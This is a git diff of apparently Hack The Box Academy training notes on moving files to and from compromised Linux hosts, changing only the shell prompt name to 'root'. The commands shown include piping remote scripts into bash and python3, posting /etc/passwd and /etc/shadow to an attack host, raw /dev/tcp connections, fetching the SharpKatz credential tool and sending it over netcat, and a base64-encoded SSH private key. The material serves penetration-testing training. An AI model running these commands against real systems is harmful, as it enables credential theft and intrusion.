@@ -607,7 +607,7 @@ Depending on the file size we want to transfer, we can use a method that does no
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ md5sum id_rsa
+root@htb[/htb]$ md5sum id_rsa
 
 4e301756a07ded0a2dd6953abf015278  id_rsa
 ```
@@ -619,7 +619,7 @@ We use `cat` to print the file content, and base64 encode the output using a pip
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat id_rsa |base64 -w 0;echo
+root@htb[/htb]$ cat id_rsa |base64 -w 0;echo
 
 LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
 ```
@@ -631,7 +631,7 @@ We copy this content, paste it onto our Linux target machine, and use `base64` w
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
+root@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
 ```
 
 Finally, we can confirm if the file was transferred successfully using the `md5sum` command.
@@ -641,7 +641,7 @@ Finally, we can confirm if the file was transferred successfully using the `md5s
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ md5sum id_rsa
+root@htb[/htb]$ md5sum id_rsa
 
 4e301756a07ded0a2dd6953abf015278  id_rsa
 ```
@@ -659,7 +659,7 @@ To download a file using `wget`, we need to specify the URL and the option \`-O'
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+root@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
 ```
 
 `cURL` is very similar to `wget`, but the output filename option is lowercase \`-o'.
@@ -669,7 +669,7 @@ AbdulrahmanTamim@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/Li
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+root@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 ```
 
 ***
@@ -687,7 +687,7 @@ Let's take the `cURL` command we used, and instead of downloading LinEnum.sh, le
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+root@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
 ```
 
 Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let's do that, this time using `wget`.
@@ -697,7 +697,7 @@ Similarly, we can download a Python script file from a web server and pipe it in
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+root@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
 
 Hello World!
 ```
@@ -713,7 +713,7 @@ There may also be situations where none of the well-known file transfer tools ar
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
+root@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
 ```
 
 **HTTP GET Request**
@@ -721,7 +721,7 @@ AbdulrahmanTamim@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
+root@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 ```
 
 **Print the Response**
@@ -729,7 +729,7 @@ AbdulrahmanTamim@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat <&3
+root@htb[/htb]$ cat <&3
 ```
 
 ***
@@ -749,7 +749,7 @@ Before we begin downloading files from our target Linux machine to our Pwnbox, l
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo systemctl enable ssh
+root@htb[/htb]$ sudo systemctl enable ssh
 
 Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
 Executing: /lib/systemd/systemd-sysv-install enable ssh
@@ -762,7 +762,7 @@ Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d lin
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo systemctl start ssh
+root@htb[/htb]$ sudo systemctl start ssh
 ```
 
 **Checking for SSH Listening Port**
@@ -770,7 +770,7 @@ AbdulrahmanTamim@htb[/htb]$ sudo systemctl start ssh
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ netstat -lnpt
+root@htb[/htb]$ netstat -lnpt
 
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
@@ -786,7 +786,7 @@ Now we can begin transferring files. We need to specify the IP address of our Pw
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
+root@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt . 
 ```
 
 Note: You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer.
@@ -810,7 +810,7 @@ The first thing we need to do is to install the `uploadserver` module.
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 -m pip install --user uploadserver
+root@htb[/htb]$ sudo python3 -m pip install --user uploadserver
 
 Collecting uploadserver
   Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
@@ -825,7 +825,7 @@ Now we need to create a certificate. In this example, we are using a self-signed
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+root@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
 
 Generating a RSA private key
 ................................................................................+++++
@@ -841,13 +841,13 @@ The webserver should not host the certificate. We recommend creating a new direc
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ mkdir https && cd https
+root@htb[/htb]$ mkdir https && cd https
 ```
 
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+root@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 
 File upload available at /upload
 Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
@@ -860,7 +860,7 @@ Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shado
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+root@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
 ```
 
 We used the option `--insecure` because we used a self-signed certificate that we trust.
@@ -878,7 +878,7 @@ It is possible to stand up a web server using various languages. A compromised L
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 -m http.server
+root@htb[/htb]$ python3 -m http.server
 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
@@ -888,7 +888,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 -m SimpleHTTPServer
+root@htb[/htb]$ python2.7 -m SimpleHTTPServer
 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
@@ -898,7 +898,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ php -S 0.0.0.0:8000
+root@htb[/htb]$ php -S 0.0.0.0:8000
 
 [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
 ```
@@ -908,7 +908,7 @@ AbdulrahmanTamim@htb[/htb]$ php -S 0.0.0.0:8000
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ruby -run -ehttpd . -p8000
+root@htb[/htb]$ ruby -run -ehttpd . -p8000
 
 [2022-05-23 09:35:46] INFO  WEBrick 1.6.1
 [2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
@@ -920,7 +920,7 @@ AbdulrahmanTamim@htb[/htb]$ ruby -run -ehttpd . -p8000
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
+root@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt
 
 --2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
 Connecting to 192.168.49.128:8000... connected.
@@ -946,7 +946,7 @@ We may find some companies that allow the `SSH protocol` (TCP/22) for outbound c
 &#x20;&#x20;
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
+root@htb[/htb]$ scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
 
 htb-student@10.129.86.90's password: 
 passwd                                                                                                           100% 3414     6.7MB/s   00:00
@@ -981,7 +981,7 @@ Python is a popular programming language. Currently, version 3 is supported, but
 &#x20; Transferring Files with Code
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+root@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
 **Python 3 - Download**
@@ -989,7 +989,7 @@ AbdulrahmanTamim@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("htt
 &#x20; Transferring Files with Code
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
+root@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
 ```
 
 ***
@@ -1007,7 +1007,7 @@ In the following example, we will use the PHP [file\_get\_contents() module](htt
 &#x20; Transferring Files with Code
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+root@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
 ```
 
 An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.
@@ -1017,7 +1017,7 @@ An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen(
 &#x20; Transferring Files with Code
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
+root@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
 fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
 ```
 
@@ -1030,7 +1030,7 @@ We can also send the downloaded content to a pipe instead, similar to the filele
 &#x20; Transferring Files with Code
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
+root@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
 ```
 
 Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.
@@ -1048,7 +1048,7 @@ Note: The URL can be used as a filename with the @file function if the fopen wra
 &#x20; Transferring Files with Code
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
+root@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
 ```
 
 ***
@@ -1058,7 +1058,7 @@ AbdulrahmanTamim@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh"
 &#x20; Transferring Files with Code
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
+root@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
 ```
 
 ***
@@ -1137,7 +1137,7 @@ If we want to upload a file, we need to understand the functions in a particular
 &#x20; Transferring Files with Code
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 -m uploadserver 
+root@htb[/htb]$ python3 -m uploadserver 
 
 File upload available at /upload
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -1148,7 +1148,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 &#x20; Transferring Files with Code
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
+root@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
 ```
 
 Let's divide this one-liner into multiple lines to understand each piece better.
@@ -1228,9 +1228,9 @@ From our attack host, we'll connect to the compromised machine on port 8000 usin
 &#x20; Miscellaneous File Transfer Methods
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
-AbdulrahmanTamim@htb[/htb]$ # Example using Original Netcat
-AbdulrahmanTamim@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+root@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+root@htb[/htb]$ # Example using Original Netcat
+root@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
 ```
 
 By utilizing Ncat on our attacking host, we can opt for `--send-only` rather than `-q`. The `--send-only` flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with `--send-only`, there is no need to anticipate further incoming information.
@@ -1240,9 +1240,9 @@ By utilizing Ncat on our attacking host, we can opt for `--send-only` rather tha
 &#x20; Miscellaneous File Transfer Methods
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
-AbdulrahmanTamim@htb[/htb]$ # Example using Ncat
-AbdulrahmanTamim@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
+root@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+root@htb[/htb]$ # Example using Ncat
+root@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
 ```
 
 Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework\_4.7\_x64/SharpKatz.exe) as input to Netcat.
@@ -1252,8 +1252,8 @@ Instead of listening on our compromised machine, we can connect to a port on our
 &#x20; Miscellaneous File Transfer Methods
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ # Example using Original Netcat
-AbdulrahmanTamim@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+root@htb[/htb]$ # Example using Original Netcat
+root@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 ```
 
 **Compromised Machine Connect to Netcat to Receive the File**
@@ -1272,8 +1272,8 @@ Let's do the same with Ncat:
 &#x20; Miscellaneous File Transfer Methods
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ # Example using Ncat
-AbdulrahmanTamim@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+root@htb[/htb]$ # Example using Ncat
+root@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
 
 **Compromised Machine Connect to Ncat to Receive the File**
@@ -1294,8 +1294,8 @@ Writing to this particular file makes Bash open a TCP connection to `host:port`,
 &#x20; Miscellaneous File Transfer Methods
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ # Example using Original Netcat
-AbdulrahmanTamim@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+root@htb[/htb]$ # Example using Original Netcat
+root@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 ```
 
 **Ncat - Sending File as Input to Netcat**
@@ -1303,8 +1303,8 @@ AbdulrahmanTamim@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
 &#x20; Miscellaneous File Transfer Methods
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ # Example using Ncat
-AbdulrahmanTamim@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+root@htb[/htb]$ # Example using Ncat
+root@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
 ```
 
 **Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File**
@@ -1399,7 +1399,7 @@ As an alternative to copy and paste, we can mount a local resource on the target
 &#x20; Miscellaneous File Transfer Methods
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+root@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
 ```
 
 **Mounting a Linux Folder Using xfreerdp**
@@ -1407,7 +1407,7 @@ AbdulrahmanTamim@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Pa
 &#x20; Miscellaneous File Transfer Methods
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+root@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
 
 To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.
@@ -1617,7 +1617,7 @@ To encrypt a file using `openssl` we can select different ciphers, see [OpenSSL 
 &#x20; Protected File Transfers
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+root@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
 
 enter aes-256-cbc encryption password:                                                         
 Verifying - enter aes-256-cbc encryption password:                              
@@ -1630,7 +1630,7 @@ Remember to use a strong and unique password to avoid brute-force cracking attac
 &#x20; Protected File Transfers
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
+root@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    
 
 enter aes-256-cbc decryption password:
 ```
@@ -1662,7 +1662,7 @@ When allowing `HTTP` uploads, it is critical to be 100% positive that users cann
 &#x20; Catching Files over HTTP/S
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+root@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
 ```
 
 **Change the Owner to www-data**
@@ -1670,7 +1670,7 @@ AbdulrahmanTamim@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
 &#x20; Catching Files over HTTP/S
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+root@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
 ```
 
 **Create Nginx Configuration File**
@@ -1696,7 +1696,7 @@ server {
 
 ```shell-session
 
